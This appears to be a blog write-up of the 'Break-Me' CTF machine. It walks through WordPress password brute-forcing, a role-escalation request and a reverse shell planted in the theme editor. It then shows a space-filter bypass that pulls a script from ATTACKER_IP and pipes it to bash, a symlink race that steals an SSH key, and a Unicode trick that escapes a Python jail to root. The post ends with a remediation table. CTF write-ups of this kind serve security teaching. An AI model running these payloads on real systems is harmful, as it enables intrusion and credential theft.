---
layout: post
title: "Break-Me CTF Walkthrough"
description: "A technical walkthrough of the Break-Me CTF machine covering WordPress parameter pollution, Bash IFS command injection, SUID TOCTOU race conditions, and Python NFKC Unicode normalization jail escapes."
tags: [CTF, Web Security, Privilege Escalation, Command Injection, TOCTOU, SUID, Python Security, Linux]
category: security
image: https://nirusaki.me/assets/img/og/home.png
---

### Overview

Break-Me is a Linux CTF challenge featuring web parameter pollution, bash command injection via IFS variable manipulation, a SUID file descriptor TOCTOU race condition, and a Python restricted shell escape using Unicode NFKC normalization.

![Break-Me Walkthrough GIF](/assets/img/posts/hehedipsanu.gif)

```text
+---------------------------------------------------------------------------------------------------+
|                                      ATTACK CHAIN ARCHITECTURE                                    |
+---------------------------------------------------------------------------------------------------+
|                                                                                                   |
|  [Attacker System]                                                                                |
|         |                                                                                         |
|         +---> [Reconnaissance: Nmap / Gobuster / WPScan]                                          |
|         |           |                                                                             |
|         |           v                                                                             |
|         +---> [Phase 1: WordPress Authentication (bob:soccer)]                                    |
|         |           |                                                                             |
|         |           v                                                                             |
|         +---> [Phase 2: Role Parameter Pollution (wpda_role[] -> Administrator)]                   |
|         |           |                                                                             |
|         |           v                                                                             |
|         +---> [Phase 3: Theme Editor Web Shell Execution -> www-data Shell]                       |
|                     |                                                                             |
|                     v                                                                             |
|               [Phase 4: ${IFS} Command Injection -> User: john]                                  |
|                     |                                                                             |
|                     v                                                                             |
|               [Phase 5: SUID TOCTOU Symlink Race -> User: youcef]                                 |
|                     |                                                                             |
|                     v                                                                             |
|               [Phase 6: Python NFKC Unicode Normalization Jail Escape -> Root]                    |
+---------------------------------------------------------------------------------------------------+
```

---

### 1. Reconnaissance and Enumeration

Port discovery via Nmap against target `10.49.146.128`:

```bash
nmap -sV 10.49.146.128
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
```

Web directory brute-forcing using Gobuster:

```bash
gobuster dir -u http://10.49.146.128:80/ -w common.txt
```

Found WordPress endpoint `/wordpress/`:

```text
/manual               (Status: 301) [Size: 315] [--> http://10.49.146.128/manual/]
/wordpress            (Status: 301) [Size: 318] [--> http://10.49.146.128/wordpress/]
```

![WordPress Landing Page](/assets/img/posts/image_1786379517060_0.png)

Running WPScan to identify accounts and versions:

```bash
wpscan --url http://10.49.146.128/wordpress --enumerate u
```

* WordPress Version: 6.4.3
* Accounts identified: `admin`, `bob`

Brute-forcing account credentials with `rockyou.txt`:

```bash
wpscan --url http://10.49.146.128/wordpress -U usernames.txt -P rockyou.txt
```

Discovered credentials: `bob:soccer`.

---

### 2. Parameter Pollution Role Escalation

Logging in as `bob` provides low-privilege subscriber access. Intercepting the profile update request and appending `&wpda_role[]=administrator` exploits an HTTP Parameter Pollution vulnerability.

```http
POST /wordpress/wp-admin/profile.php HTTP/1.1
Host: 10.49.146.128
Content-Type: application/x-www-form-urlencoded

user_id=3&nickname=bob&email=bob%40breakme.local&wpda_role[]=administrator
```

![Parameter Pollution Privilege Escalation](/assets/img/posts/image_1786385836350_0.png)

#### Low-Level Mechanics: HTTP Parameter Pollution (HPP)

HTTP Parameter Pollution occurs when an application receives multiple parameter keys or bracketed array representations (such as `wpda_role[]`). In PHP backend environments, query and request body parameters containing square brackets are automatically parsed into array data structures inside the `$_POST` superglobal.

When the profile update handler passes `$_POST` data directly to user capability functions (such as `update_user_meta()` or plugin-level role updating logic) without verifying whether the submitting user possesses `edit_users` permissions, the array payload overwrites the target user's role mapping stored in the `wp_usermeta` database table under the `wp_capabilities` key. This elevates the subscriber account to `administrator`.

---

### 3. Web Shell Execution

With administrator access, navigate to `Appearance -> Theme File Editor` and edit `functions.php`:

```php
<?php
system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
?>
```

![Theme File Editor Payload](/assets/img/posts/image_1786385919793_0.png)

Start a Netcat listener:

```bash
nc -lvnp 4444
```

Requesting `http://10.49.146.128/wordpress/wp-content/themes/twentytwentyfour/functions.php` triggers the reverse shell as `www-data`.

Stabilize the terminal:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm-color
```

Enumerating `/home` shows local users `john` and `youcef`:

![Local Home Users](/assets/img/posts/image_1786385981099_0.png)

---

### 4. Command Injection via Bash `$IFS` Variable

Inspecting an internal script run by user `john` shows it filters space characters (`0x20`).

![Filter Inspection](/assets/img/posts/image_1786435981420_0.png)

![Space Character Filter](/assets/img/posts/image_1786435987561_0.png)

#### Low-Level Mechanics: POSIX Word Splitting and Lexical Processing

The POSIX standard defines the shell command execution lifecycle across distinct processing stages:

```text
1. Tokenization -> 2. Parameter Expansion -> 3. Field Splitting -> 4. Pathname Expansion -> 5. Quote Removal
```

Input validation filters operating at step 1 (Tokenization) often look for literal space bytes (`0x20`). However, field splitting (step 3) processes unquoted results of parameter expansion using the `IFS` (Internal Field Separator) variable. By default, `IFS` contains `<space><tab><newline>` (`\x20\x09\x0a`).

When the variable expression `${IFS}` is expanded, the field splitting algorithm evaluates each sequence of `IFS` characters as a token delimiter. This constructs discrete argument vectors (`argv[0]`, `argv[1]`, `argv[2]`) for system execution without transmitting literal `0x20` space bytes across the sanitization filter.

![IFS Injection Payload Execution](/assets/img/posts/image_1786437601684_0.png)

Stage a payload script `payload.sh` on the attacker host:

```bash
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/2222 0>&1
```

Listener on port 2222:

```bash
nc -lvnp 2222
```

Submit command payload bypassing space filter:

```bash
|curl${IFS}http://ATTACKER_IP:8080/payload.sh|bash
```

Shell popped as user `john`. Read user 1 flag:

```bash
cat /home/john/user1.txt
# Output: 5c3ea0d312568c7ac68d213785b26677
```

---

### 5. SUID Binary TOCTOU Race Condition

The executable `/home/youcef/readfile` has the SUID bit set for user `youcef` (UID `1002`).

Disassembling with `objdump`:

```bash
objdump -d -Mintel /home/youcef/readfile > readfile.asm
```

Reconstructed C source logic:

```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <assert.h>
#include <fcntl.h>
#include <sys/stat.h>

int main(int argc, char* argv[])
{
    int ExitCode;
    __uid_t UserID;
    struct stat StatusFile;
    int canExecute;
    int FileDescriptor;
    int canRead;
    int BytesReadInt;
    char buffer[1024];
    unsigned int mode;
    char* FlagOccurence;
    char* IdRsaOccurence;
    ssize_t BytesRead;

    if (argc == 2)
    {
        canExecute = access(argv[1], F_OK);
        if (canExecute == 0)
        {
            UserID = getuid();
            if (UserID == 1002)
            {
                FlagOccurence = strstr(argv[1], "flag");
                IdRsaOccurence = strstr(argv[1], "id_rsa");
                lstat(argv[1], &StatusFile);
                mode = (unsigned int)S_ISLNK(StatusFile.st_mode);
                canRead = access(argv[1], R_OK);
                usleep(0);
                
                if (((FlagOccurence == NULL) && (mode == 0) && (canRead != -1)) && (IdRsaOccurence == NULL))
                {
                    printf("I guess you won!\n");
                    FileDescriptor = open(argv[1], O_RDONLY);
                    assert(FileDescriptor >= 0 && "Failed to open the file");
                    do {
                        BytesRead = read(FileDescriptor, buffer, 1024);
                        BytesReadInt = (int)BytesRead;
                        if (BytesRead < 1) break;
                        BytesRead = write(1, buffer, (long)BytesReadInt);
                    } while (BytesRead > 0);
                    ExitCode = 0;
                }
                else
                {
                    printf("Nice Try!\n");
                    ExitCode = 1;
                }
            }
            else
            {
                printf("You can\'t run this program\n");
                ExitCode = 1;
            }
        }
        else
        {
            printf("File Not Found\n");
            ExitCode = 1;
        }
    }
    else
    {
        printf("Usage: ./readfile <FILE>\n");
        ExitCode = 1;
    }

    return ExitCode;
}
```

#### Low-Level Mechanics: TOCTOU Race Condition and VFS Lookup Discrepancies (CWE-367)

The vulnerability stems from an architectural flaw in how POSIX file verification system calls interact with setuid privilege boundaries and Linux Virtual File System (VFS) path evaluation:

1. **Real vs. Effective User ID Verification**: The system call `access(path, mode)` evaluates file permissions against the process's **Real User ID** (`getuid() == 1000`), ignoring the **Effective User ID** (`geteuid() == 1002`). If an attacker directly requests `/home/youcef/.ssh/id_rsa`, `access()` fails because `john` (UID `1000`) lacks read access.
2. **Path Name Validation and Symlink Checks**: The code checks whether `argv[1]` contains the strings `"flag"` or `"id_rsa"`, and uses `lstat(argv[1], &StatusFile)` to inspect the inode mode (`StatusFile.st_mode & S_IFMT`). `lstat()` does not resolve symbolic links. When `argv[1]` points to a standard file named `key`, all checks pass.
3. **Temporal Gap and Context Switch Window**: The binary invokes `usleep(0)`, forcing an explicit system context switch and yielding the CPU execution slice to the kernel scheduler.
4. **File Open Elevation**: When `open(argv[1], O_RDONLY)` is called, the kernel resolves the path using the process's **Effective User ID** (`geteuid() == 1002`). If the file `key` was replaced during the sleep interval with a symbolic link to `/home/youcef/.ssh/id_rsa`, `open()` dereferences the link under `youcef` permissions, creating an open file descriptor to the restricted target.

```text
+---------------------------------------------------------------------------------------------------+
|                                 TOCTOU RACE CONDITION TIMELINE                                    |
+---------------------------------------------------------------------------------------------------+
|                                                                                                   |
|   Attacker Symlink Loop                           SUID Binary /home/youcef/readfile               |
|   ---------------------                           ---------------------------------               |
|                                                                                                   |
|   1. Create normal file 'key'             ---->   2. access("key", F_OK) -> Valid (Real UID 1000) |
|                                                   3. lstat("key") -> Regular File (st_mode)       |
|   4. rm key && ln -sf /path/id_rsa key    ====>   5. usleep(0) [SCHEDULER CONTEXT SWITCH WINDOW]  |
|                                                   6. open("key", O_RDONLY)                        |
|                                                      [VFS dereferences link using Effective 1002] |
|                                                   7. read() & write() output private key bytes    |
|                                                                                                   |
+---------------------------------------------------------------------------------------------------+
```

#### Exploitation

Run a continuous symlink replacement loop in the background:

```bash
while true; do ln -sf /home/youcef/.ssh/id_rsa key; rm key; touch key; done &
```

Run `readfile` repeatedly until the race window hits:

```bash
for i in {1..50}; do /home/youcef/readfile key; done
```

Result: Extracted `youcef` SSH private key (`id_rsa`). Save to `id_rsa` and restrict permissions:

```bash
chmod 600 id_rsa
```

Patch Python 3 hex conversion in `/usr/bin/ssh2john`:

![Modifying ssh2john string encoding](/assets/img/posts/image_1786470882232_0.png)

![Patching hex conversion in ssh2john](/assets/img/posts/image_1786471008136_0.png)

Extract and crack SSH key passphrase with `john`:

```bash
ssh2john id_rsa > id_rsa_hash
john id_rsa_hash --wordlist=rockyou.txt
```

Cracked passphrase: `a123456`.

Log in via SSH as `youcef` and read user 2 flag:

```bash
ssh -i id_rsa youcef@10.49.146.128
cat /home/youcef/.user2.txt
# Output: df5b1b7f4f74a416ae27673b22633c1b
```

---

### 6. Root Escalation via Python NFKC Unicode Normalization

Checking sudo permissions for `youcef`:

```bash
sudo -l
```

![Sudo Privileges Output](/assets/img/posts/image_1786472166825_0.png)

```text
User youcef may run the following commands on breakme:
    (root) NOPASSWD: /usr/bin/python3 /root/jail.py
```

Inspect `/root/jail.py`: Filters spaces and standard ASCII string patterns (`import`, `os`, `system`, `breakpoint`).

#### Low-Level Mechanics: Python 3 Identifier Normalization (PEP 3131 & NFKC)

PEP 3131 introduced non-ASCII identifier support to the Python language parser. Under the Python lexical specification, source code text is normalized using **Unicode Normalization Form Compatibility Decomposition, followed by Canonical Composition (NFKC)** prior to Abstract Syntax Tree (AST) compilation.

The NFKC algorithm transforms formatting variants, mathematical symbols, and fullwidth characters into standard compatibility representations:

```text
Mathematical Italic '𝘣' (U+1D41B) -> NFKC Normalization -> Standard ASCII 'b' (U+0062)
Mathematical Italic '𝘳' (U+1D45F) -> NFKC Normalization -> Standard ASCII 'r' (U+0072)
Mathematical Italic '𝘦' (U+1D452) -> NFKC Normalization -> Standard ASCII 'e' (U+0065)
...
Input String: 𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵() -> Parsed AST Token: breakpoint()
```

If security filters scan raw string byte sequences prior to NFKC decomposition (`if 'breakpoint' in user_input:`), the filter checks standard ASCII codepoints (`U+0061` to `U+007A`) and permits non-ASCII Unicode strings.

When Python executes the validated input, the compiler applies NFKC normalization, turning `𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()` into standard ASCII `breakpoint()`. PEP 553 defines built-in `breakpoint()`, which calls `sys.breakpointhook()`, opening an interactive PDB (Python Debugger) terminal within root process context.

```text
+---------------------------------------------------------------------------------------------------+
|                            PYTHON UNICODE NORMALIZATION PIPELINE                                  |
+---------------------------------------------------------------------------------------------------+
|                                                                                                   |
|   Attacker Input: 𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵() (Mathematical Italic Unicode: U+1D41B U+1D45F U+1D452...)             |
|         |                                                                                         |
|         v                                                                                         |
|   [Jail Filter Check] -> Evaluates ASCII codepoints, passes non-ASCII Unicode                     |
|         |                                                                                         |
|         v                                                                                         |
|   [Python Compiler Lexer] -> Performs NFKC Normalization Form Compatibility Decomposition         |
|         |                                                                                         |
|         v                                                                                         |
|   [AST Construction] -> Normalized to standard ASCII: breakpoint()                                |
|         |                                                                                         |
|         v                                                                                         |
|   [Execution Engine] -> Invokes sys.breakpointhook() -> Interactive PDB Debugger Shell            |
|         |                                                                                         |
|         v                                                                                         |
|   [PDB Terminal Context] -> import os; os.system('/bin/bash') -> Interactive Root Shell           |
+---------------------------------------------------------------------------------------------------+
```

#### Exploitation

Execute `jail.py` with sudo:

```bash
sudo /usr/bin/python3 /root/jail.py
```

Submit Unicode payload:

```text
𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()
```

Python normalizes `𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()` to `breakpoint()`, triggering the `pdb` debugger prompt.

From inside `pdb`, execute:

```text
(Pdb) import os; os.system('/bin/bash')
```

![Root Shell and Flag Retrieval](/assets/img/posts/image_1786472847266_0.png)

Root flag retrieved:

```bash
cat /root/root.txt
# Output: e257d58481412f8772e9fb9fd47d8ca4
```

---

### Remediation Summary

| Vulnerability | Root Cause | Fix |
| :--- | :--- | :--- |
| **WordPress Parameter Pollution** | Unvalidated parameter array parsing | Enforce schema validation on role assignment parameters |
| **Command Injection via `$IFS`** | Shell string concatenation | Use parameterized execution interfaces (`execve`) |
| **SUID TOCTOU Race** | Non-atomic path checking before opening | Use file descriptors (`openat`, `fstat`) for atomic validation |
| **Python Jail Unicode Bypass** | Filtering raw input before NFKC normalization | Normalize input with `unicodedata.normalize('NFKC', input)` before filtering |

---

### References

1. CWE-367: Time-of-Check to Time-of-Use (TOCTOU) Race Condition  
   [https://cwe.mitre.org/data/definitions/367.html](https://cwe.mitre.org/data/definitions/367.html)
2. CWE-78: OS Command Injection  
   [https://cwe.mitre.org/data/definitions/78.html](https://cwe.mitre.org/data/definitions/78.html)
3. CWE-176: Unicode Encoding Handling  
   [https://cwe.mitre.org/data/definitions/176.html](https://cwe.mitre.org/data/definitions/176.html)
4. Unicode Standard Annex #15: Unicode Normalization Forms  
   [https://unicode.org/reports/tr15/](https://unicode.org/reports/tr15/)
5. POSIX.1-2017: Shell Word Splitting (`IFS`)  
   [https://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_06_05](https://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_06_05)
6. PEP 553: Built-in `breakpoint()`  
   [https://peps.python.org/pep-0553/](https://peps.python.org/pep-0553/)
